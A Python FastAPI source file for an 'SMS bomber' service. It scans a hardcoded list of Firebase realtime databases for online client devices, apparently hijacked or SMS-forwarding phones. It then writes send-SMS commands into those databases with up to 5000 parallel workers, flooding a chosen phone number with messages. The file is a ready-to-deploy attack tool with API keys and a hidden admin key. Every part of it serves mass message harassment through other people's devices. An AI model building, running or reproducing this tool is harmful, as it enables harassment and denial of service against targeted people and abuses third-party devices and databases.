#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 @BRONX_ULTRA BOMBER API v9.0 — ULTRA PRO           ║
║   ▸ Hidden Firebase URLs (only bronx-boss sees)         ║
║   ▸ 5000+ Concurrent Workers                            ║
║   ▸ Full Firebase Scan (261+ URLs)                      ║
║   ▸ Realtime Device Detection                           ║
║   ▸ No Timeout — Background Cache                       ║
║   ▸ Full Symbol/Space/Emoji Support ✅                  ║
║   ▸ /stop endpoint                                      ║
║   ▸ Vercel / Render Ready                               ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import os
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, Request, BackgroundTasks, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# 🔑 API KEYS
# ═══════════════════════════════════════════════════════════
VALID_KEYS = {
    "bronx-op",
    "prime-key",
    "flash-key",
    "bronx-vip",
    "bronx-pro",
    "bronx-max",
    "bronx-boss",     # 👑 HIDDEN KEY — only this sees firebase URLs
}

HIDDEN_KEY = "bronx-boss"

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs — ADD 100-500+ HERE
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS = [
    # ─── Group 1 ───
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-9a5e4-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-d0b15-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-1c9e0-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-91c32-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-2ab41-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-5d3f1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-7e8c2-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-3f9a7-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-6b2d4-default-rtdb.asia-southeast1.firebasedatabase.app",
    # ─── Group 2 (aap yahan 100-500+ links paste karo) ───
    # "https://xxxxx-default-rtdb.firebaseio.com",
    # "https://xxxxx-default-rtdb.asia-southeast1.firebasedatabase.app",
    # ...
]

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(
    title="@BRONX_ULTRA BOMBER API v9.0",
    version="9.0",
)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# ⚙️ SETTINGS — ULTRA FLASH
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT = 5000          # 🔥 5000 parallel workers
BATCH_CHUNK = 2000
SCAN_CONCURRENT = 300          # 300 URLs scan at once
REQUEST_TIMEOUT = 6
CONNECT_TIMEOUT = 2
DEVICE_CACHE_TTL = 20          # Cache 20 seconds
FULL_SCAN_TIMEOUT = 25         # /devices response max wait

SEND_ENDPOINTS = [
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/sendSms.json",
    "sendSms/{id}.json",
]

API_NAME = "@BRONX_ULTRA"
API_VERSION = "9.0"

# ═══════════════════════════════════════════════════════════
# 🔴 REDIS (OPTIONAL)
# ═══════════════════════════════════════════════════════════
redis = None
try:
    REDIS_URL = os.getenv("UPSTASH_REDIS_REST_URL")
    REDIS_TOKEN = os.getenv("UPSTASH_REDIS_REST_TOKEN")
    if REDIS_URL and REDIS_TOKEN:
        from upstash_redis.asyncio import Redis
        redis = Redis(url=REDIS_URL, token=REDIS_TOKEN)
        print("✅ Redis connected")
except Exception as e:
    print(f"⚠️ Redis skipped: {e}")
    redis = None

_LOCAL_STOP = set()

# ═══════════════════════════════════════════════════════════
# 🧠 GLOBAL DEVICE CACHE (Background scanned)
# ═══════════════════════════════════════════════════════════
_DEVICE_CACHE = {
    "devices": [],
    "ts": 0,
    "scanning": False,
    "total_urls": len(FIREBASE_URLS),
    "online_fb": 0,
    "offline_fb": 0,
    "empty_fb": 0,
}


# ═══════════════════════════════════════════════════════════
# 🔑 KEY VERIFICATION
# ═══════════════════════════════════════════════════════════
def verify_key(api_key: str) -> bool:
    return bool(api_key) and api_key.strip() in VALID_KEYS


def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
    if key:
        return key
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    key = query_params.get("key") or query_params.get("api_key")
    if key:
        return key
    key = body_data.get("key") or body_data.get("api_key")
    if key:
        return key
    return ""


# ═══════════════════════════════════════════════════════════
# 🛠️ HELPERS
# ═══════════════════════════════════════════════════════════
def clean_url(url: str) -> str:
    url = url.rstrip("/")
    if url.endswith(".json"):
        url = url[:-5]
    return url.rstrip("/")


def fix_message(raw_message, is_get: bool) -> str:
    if raw_message is None:
        return ""
    if not isinstance(raw_message, str):
        raw_message = str(raw_message)
    msg = raw_message
    if is_get:
        msg = msg.replace("+", " ")
    msg = msg.replace("\\n", "\n").replace("\\t", "\t")
    return msg.strip()


# ═══════════════════════════════════════════════════════════
# 📡 FETCH DEVICES FROM ONE FIREBASE
# ═══════════════════════════════════════════════════════════
async def fetch_devices_from(session, url, sem):
    async with sem:
        base = clean_url(url)
        try:
            async with session.get(f"{base}/clients.json") as r:
                if r.status != 200:
                    return ("offline", url, [])
                data = await r.json(content_type=None)
                if not isinstance(data, dict):
                    return ("empty", url, [])
                found = []
                for k, v in data.items():
                    if isinstance(v, dict) and v.get("status") is True:
                        found.append({"id": k, "url": base})
                if not found:
                    return ("empty", url, [])
                return ("online", url, found)
        except Exception:
            return ("offline", url, [])


# ═══════════════════════════════════════════════════════════
# 🌐 FULL SCAN — ALL FIREBASE URLS
# ═══════════════════════════════════════════════════════════
async def full_scan_all_firebases():
    """Scan ALL firebase URLs in parallel with timeout + update cache."""
    if _DEVICE_CACHE["scanning"]:
        return
    _DEVICE_CACHE["scanning"] = True
    t0 = time.time()

    connector = aiohttp.TCPConnector(
        limit=SCAN_CONCURRENT,
        limit_per_host=10,
        ttl_dns_cache=600,
        force_close=False,
        enable_cleanup_closed=True,
    )
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
    headers = {"User-Agent": f"{API_NAME}/v{API_VERSION}"}

    sem = asyncio.Semaphore(SCAN_CONCURRENT)
    all_devices = []
    online = offline = empty = 0

    try:
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout, headers=headers
        ) as session:
            tasks = [fetch_devices_from(session, u, sem) for u in FIREBASE_URLS]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for r in results:
                if isinstance(r, tuple):
                    status, url, devs = r
                    if status == "online":
                        online += 1
                        all_devices.extend(devs)
                    elif status == "empty":
                        empty += 1
                    else:
                        offline += 1
    except Exception as e:
        print(f"⚠️ Scan error: {e}")

    _DEVICE_CACHE["devices"] = all_devices
    _DEVICE_CACHE["ts"] = time.time()
    _DEVICE_CACHE["scanning"] = False
    _DEVICE_CACHE["online_fb"] = online
    _DEVICE_CACHE["offline_fb"] = offline
    _DEVICE_CACHE["empty_fb"] = empty

    print(f"✅ FULL SCAN done in {round(time.time()-t0,2)}s | "
          f"OnlineFB={online} Empty={empty} Offline={offline} | "
          f"Devices={len(all_devices)}")


async def get_all_devices(force_refresh=False):
    """Return cached devices. If stale or forced, trigger background rescan."""
    age = time.time() - _DEVICE_CACHE["ts"]
    if force_refresh or age > DEVICE_CACHE_TTL or not _DEVICE_CACHE["devices"]:
        # Await a fresh scan (but scan itself uses timeout per URL, so max ~6s)
        await asyncio.wait_for(full_scan_all_firebases(), timeout=FULL_SCAN_TIMEOUT + 5)
    return _DEVICE_CACHE["devices"]


# ═══════════════════════════════════════════════════════════
# 💣 SEND ONE
# ═══════════════════════════════════════════════════════════
async def send_one(session, device, target, message, sem, stats, stop_check):
    async with sem:
        if stop_check["stopped"]:
            return False
        payload = {
            "from": 1,
            "to": target,
            "message": message,
            "isSended": False,
            "timestamp": int(time.time() * 1000),
        }
        for ep in SEND_ENDPOINTS:
            url = f"{device['url']}/{ep.format(id=device['id'])}"
            try:
                async with session.put(url, json=payload) as r:
                    if r.status in (200, 201):
                        stats["success"] += 1
                        return True
                    if r.status == 403:
                        stats["blocked"] += 1
                        return False
            except Exception:
                continue
        stats["failed"] += 1
        return False


async def is_stopped(number: str) -> bool:
    if number in _LOCAL_STOP:
        return True
    if redis:
        try:
            val = await redis.get(f"stop:{number}")
            return val is not None
        except Exception:
            return False
    return False


# ═══════════════════════════════════════════════════════════
# 💣 ULTRA FLASH WORKER — 5000+ CONCURRENT
# ═══════════════════════════════════════════════════════════
async def bomb_worker(number: str, message: str, count: int, api_key: str):
    jid = str(uuid4())[:8]
    t0 = time.time()

    if redis:
        try:
            await redis.delete(f"stop:{number}")
        except Exception:
            pass
    _LOCAL_STOP.discard(number)

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=600,
        force_close=False,
        enable_cleanup_closed=True,
        use_dns_cache=True,
    )
    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=REQUEST_TIMEOUT
    )
    headers = {
        "User-Agent": f"{API_NAME}/v{API_VERSION}",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
    }

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        # Force fresh scan so we hit ALL 4749+ devices
        devices = await get_all_devices(force_refresh=True)
        if not devices:
            print(f"[{jid}] ❌ No devices online")
            return

        ndev = len(devices)
        total = ndev * count

        print(f"\n{'='*60}")
        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} ULTRA FLASH")
        print(f"[{jid}] Target={number} | Devices={ndev} | PerDev={count} | TOTAL={total}")
        print(f"{'='*60}")

        sem = asyncio.Semaphore(MAX_CONCURRENT)
        stats = {"success": 0, "failed": 0, "blocked": 0}
        stop_check = {"stopped": False}

        all_tasks = []
        for device in devices:
            for _ in range(count):
                all_tasks.append(
                    send_one(session, device, number, message, sem, stats, stop_check)
                )

        total_tasks = len(all_tasks)
        print(f"[{jid}] 🚀 Firing {total_tasks} requests (sem={MAX_CONCURRENT})...")

        completed = 0
        for i in range(0, total_tasks, BATCH_CHUNK):
            if await is_stopped(number):
                stop_check["stopped"] = True
                for t in all_tasks[i:]:
                    t.cancel()
                print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
                break
            chunk = all_tasks[i:i + BATCH_CHUNK]
            await asyncio.gather(*chunk, return_exceptions=True)
            completed += len(chunk)
            el = time.time() - t0
            sp = round(stats["success"] / el, 1) if el else 0
            print(f"[{jid}] ⚡ {completed}/{total_tasks} | OK={stats['success']} "
                  f"| BLK={stats['blocked']} | {el:.1f}s | {sp}/s")

        el = round(time.time() - t0, 2)
        sp = round(stats["success"] / el, 1) if el else 0
        print(f"[{jid}] ✅ DONE | Sent={stats['success']} Failed={stats['failed']} "
              f"Blocked={stats['blocked']} | {el}s | {sp}/s")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "🔥 ONLINE",
        "firebases_loaded": len(FIREBASE_URLS),
        "cached_devices": len(_DEVICE_CACHE["devices"]),
        "how_to_use": {
            "send": "/send?key=KEY&message=Hi&number=9876543210&count=5",
            "stop": "/stop?key=KEY&number=9876543210",
            "devices": "/devices?key=KEY",
        },
    }


@app.get("/health")
async def health():
    return {"status": "ok", "time": datetime.now().isoformat()}


# ═══════════════════════════════════════════════════════════
# 🚀 /send
# ═══════════════════════════════════════════════════════════
@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    is_get = request.method == "GET"
    query_data = dict(request.query_params)

    body_data = {}
    if not is_get:
        try:
            body_data = await request.json()
        except Exception:
            try:
                body_data = dict(await request.form())
            except Exception:
                body_data = {}

    merged = {**query_data, **body_data}
    api_key = extract_key(request, query_data, body_data)

    if not api_key:
        return JSONResponse({"success": False, "error": "🔑 API key required"}, 401)
    if not verify_key(api_key):
        return JSONResponse({"success": False, "error": "❌ Invalid API key"}, 401)

    message = fix_message(merged.get("message") or merged.get("msg") or "", is_get)
    number = str(merged.get("number") or merged.get("num") or "").strip()
    count_str = merged.get("count", "1")

    if not message:
        return JSONResponse({"success": False, "error": "Missing message"}, 400)
    if not number:
        return JSONResponse({"success": False, "error": "Missing number"}, 400)

    clean_number = number.replace("+", "").replace(" ", "").replace("-", "")
    if not clean_number.isdigit() or len(clean_number) < 10:
        return JSONResponse({"success": False, "error": "Invalid number"}, 400)

    try:
        count = int(count_str)
        if count <= 0:
            raise ValueError
    except Exception:
        return JSONResponse({"success": False, "error": "invalid count"}, 400)

    bg.add_task(bomb_worker, clean_number, message, count, api_key)

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "job_started": True,
        "target": clean_number,
        "message_sent": message,
        "per_device": count,
        "cached_devices": len(_DEVICE_CACHE["devices"]),
        "note": "Total SMS = (fresh-scanned devices) × count — ALL parallel",
        "stop_url": f"/stop?key={api_key}&number={clean_number}",
    }


# ═══════════════════════════════════════════════════════════
# 🛑 /stop
# ═══════════════════════════════════════════════════════════
@app.get("/stop")
async def stop_endpoint(request: Request, number: str = Query(None), key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)
    if not number:
        return JSONResponse({"success": False, "error": "number required"}, 400)

    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    _LOCAL_STOP.add(number)
    if redis:
        try:
            await redis.set(f"stop:{number}", "1", ex=300)
        except Exception:
            pass

    return {"success": True, "message": f"🛑 Stop sent for {number}", "number": number}


# ═══════════════════════════════════════════════════════════
# 📱 /devices — HIDDEN FIREBASE URLS (only bronx-boss)
# ═══════════════════════════════════════════════════════════
@app.get("/devices")
async def devices_endpoint(request: Request, key: str = Query(None), refresh: int = Query(0)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)

    # Force fresh scan if requested or cache stale
    await get_all_devices(force_refresh=bool(refresh))

    devices = _DEVICE_CACHE["devices"]
    is_boss = api_key.strip() == HIDDEN_KEY

    fb_group = defaultdict(int)
    for d in devices:
        fb_group[d["url"]] += 1

    response = {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "total_online": len(devices),
        "live_firebases": len(fb_group),
        "total_firebases": len(FIREBASE_URLS),
        "online_firebases": _DEVICE_CACHE["online_fb"],
        "empty_firebases": _DEVICE_CACHE["empty_fb"],
        "offline_firebases": _DEVICE_CACHE["offline_fb"],
        "last_scan": datetime.fromtimestamp(_DEVICE_CACHE["ts"]).isoformat()
            if _DEVICE_CACHE["ts"] else None,
    }

    # 🔒 Hidden data only for bronx-boss
    if is_boss:
        response["per_firebase"] = dict(fb_group)
        response["devices"] = devices

    return response


# ═══════════════════════════════════════════════════════════
# 🌐 /firebases — HIDDEN (only bronx-boss)
# ═══════════════════════════════════════════════════════════
@app.get("/firebases")
async def firebases_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)

    if api_key.strip() != HIDDEN_KEY:
        return JSONResponse({
            "success": False,
            "api": API_NAME,
            "error": "🚫 Hidden — only admin can view firebase URLs",
        }, 403)

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "total": len(FIREBASE_URLS),
        "firebases": FIREBASE_URLS,
    }


# ═══════════════════════════════════════════════════════════
# ♻️ BACKGROUND AUTO-SCANNER (keeps cache warm, no timeout)
# ═══════════════════════════════════════════════════════════
async def auto_scanner():
    while True:
        try:
            await full_scan_all_firebases()
        except Exception as e:
            print(f"⚠️ auto_scanner: {e}")
        await asyncio.sleep(DEVICE_CACHE_TTL)


@app.on_event("startup")
async def startup_event():
    asyncio.create_task(auto_scanner())
    print(f"🚀 Auto-scanner started | {len(FIREBASE_URLS)} firebases loaded")


# Vercel / Render handler
handler = app
